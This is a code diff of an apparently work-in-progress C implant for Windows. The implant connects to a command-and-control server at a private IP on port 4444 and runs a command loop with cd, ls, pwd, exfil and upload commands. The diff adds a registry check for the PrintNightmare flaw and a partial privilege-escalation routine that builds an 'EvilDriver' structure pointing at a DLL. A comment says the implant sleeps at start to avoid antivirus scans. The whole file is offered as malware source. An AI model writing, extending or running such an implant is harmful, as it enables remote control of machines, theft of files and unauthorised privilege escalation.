@@ -13,7 +13,7 @@
 
 // Configurations
 #define SLEEP 1
-#define SERVER_IP "127.0.0.1"
+#define SERVER_IP "192.168.187.13"
 #define SERVER_PORT 4444
 
 SOCKET c2_sock;
@@ -167,36 +167,94 @@ DRIVER_INFO_2* getDrivers(BOOL print) {
 	return (DRIVER_INFO_2*) drivers;
 }
 
-
-
-// Attempts to gain administrator priveleges by using the Printer Nightmare CVE
-DWORD escalate(char* dll_path) {
-    // DWORD FLAGS = APD_COPY_ALL_FILES | 0x10 | 0x8000;
-	// CHAR dll_path[1024];
-	// CHAR driver_path[1024];
-    int status;
-
-    // TODO: check registry first
+// Checks the registry to see if host is vulnerable to printer nightmare.
+// Returns 1 for vulnerable, 0 for not vulnerable, -1 on error
+DWORD check_registry_for_privesc() {
+    DWORD status;
     HKEY hKey;
-    status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint", 0, KEY_READ, &hKey);
-    if (status != ERROR_SUCCESS) {
-        // send message back to c2 server saying that check failed. TODO: do we try anyways if it fails?
-    }
-
-    // Get value
     DWORD val;
-    int size = 4;
-    status = RegGetValue(hKey, NULL, "RestrictDriverInstallationToAdministrators", RRF_RT_REG_DWORD, NULL, &val, &size);
+    int size = 4; // size of DWORD
+
+    // Open handle
+    status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint", 0, KEY_READ, &hKey);
+    if (status == ERROR_FILE_NOT_FOUND) {
+        return 0;
+    }
     if (status != ERROR_SUCCESS) {
-        // send message back to c2 server saying that registry check failed. TODO
+        return -1;
     }
 
-    // TODO finish
+    // Read first value
+    status = RegGetValue(hKey, NULL, "RestrictDriverInstallationToAdministrators", RRF_RT_REG_DWORD, NULL, &val, &size);
+    if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 0)) {
+        RegCloseKey(hKey);
+        return 0;
+    }
+    if (status != ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return -1;
+    }
 
+    // Need to check both registry values
+    status = RegGetValue(hKey, NULL, "NoWarningNoElevationOnInstall", RRF_RT_REG_DWORD, NULL, &val, &size);
+    if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 1)) {
+        RegCloseKey(hKey);
+        return 0;
+    }
+    if (status != ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return -1;
+    }
 
     RegCloseKey(hKey);
-    return 0;
+    return 1;
+}
 
+
+// Attempts to gain administrator privileges via the Printer Nightmare CVE
+DWORD escalate() {
+    DWORD FLAGS = APD_COPY_ALL_FILES | 0x10 | 0x8000;
+	CHAR dll_path[MAX_PATH];
+	CHAR driver_path[MAX_PATH];
+
+    // Check registry first
+    int vulnerable  = check_registry_for_privesc();
+    if (vulnerable == 0) {
+        c2_send(c2_sock, "Target not vulnerable", 21);
+        return -1;
+    }
+    if (vulnerable == -1) {
+        c2_send(c2_sock, "ERROR: Could not check registry", 31);
+        // TODO: If there was an error what do we do?
+    }
+
+	// Get path to a driver
+	printf("[*] Enumerating drivers...\n");
+	DRIVER_INFO_2* drivers = getDrivers(FALSE);
+	strncpy(driver_path, drivers[0].pDriverPath, MAX_PATH);
+	LocalFree(drivers);
+	printf("[+] Path to driver: %s\n", driver_path);
+
+	// Create driver object
+	DRIVER_INFO_2 payload = {
+		.cVersion = 3,
+		.pDriverPath = driver_path,
+		.pConfigFile = dll_path,
+		.pDataFile = dll_path,
+		.pEnvironment = "Windows x64",
+		.pName = "EvilDriver"
+	};
+
+	// printf("[*] Attempting to add new driver...\n");
+	// DWORD res = AddPrinterDriverEx(NULL, 2, (PBYTE) &payload, FLAGS);
+	// if (!res) {
+	// 	printf("[!] Adding printer driver failed\n");
+	// 	exit(1);
+	// }
+	// printf("[*] Driver added successfully\n");
+
+
+    return 0;
 }
 
 
@@ -209,7 +267,7 @@ int main() {
 
 
     // Sleep on start to avoid AV scans
-    Sleep(SLEEP * 1000);
+    // Sleep(SLEEP * 1000);
 
     // Basic setup
     if (!setup_comms()) {
@@ -243,10 +301,12 @@ int main() {
         if (strncmp(buffer, "exit", 4) == 0) {
             break;
         }
+
         else if(strncmp(buffer, "cd ", 3) == 0 && len >= 4) {
             if (! change_dir(buffer + 3, len - 3)) // buffer + 3 is start of arg passed to cd
                 c2_send(c2_sock, "Invalid dir", 11);
         }
+
         else if(strncmp(buffer, "ls", 2) == 0) {
             char listing[4096] = {0};
             if (len == 2)
@@ -262,21 +322,27 @@ int main() {
                 c2_send(c2_sock, "ERROR", 5);
             }
         }
+
         else if(strncmp(buffer, "pwd", 2) == 0) {
             c2_send(c2_sock, pwd, strlen(pwd));
         }
+
         else if(strncmp(buffer, "exfil ", 5) == 0) {
             if (len >= 7) {
                 exfil(buffer + 6);
             }   
         }
+
         else if(strncmp(buffer, "upload ", 6) == 0) {
             // falls more on the c2 server
         }
+
         else if(strncmp(buffer, "drivers", 7) == 0) {
             getDrivers(TRUE);
         }
+
         else if(strncmp(buffer, "escalate", 8) == 0) {
+            escalate();
         }
         // TODO: what else?
 
